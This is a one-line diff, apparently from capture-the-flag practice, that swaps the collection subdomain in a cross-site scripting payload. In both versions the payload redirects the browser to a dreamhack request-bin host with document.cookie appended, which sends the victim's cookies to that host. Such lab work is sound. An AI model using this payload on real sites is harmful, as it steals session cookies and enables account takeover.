@@ -1,1 +1,1 @@
-location.href="https://baotefj.request.dreamhack.games?memo="+document.cookie;
+location.href="https://rokonan.request.dreamhack.games?memo="+document.cookie;
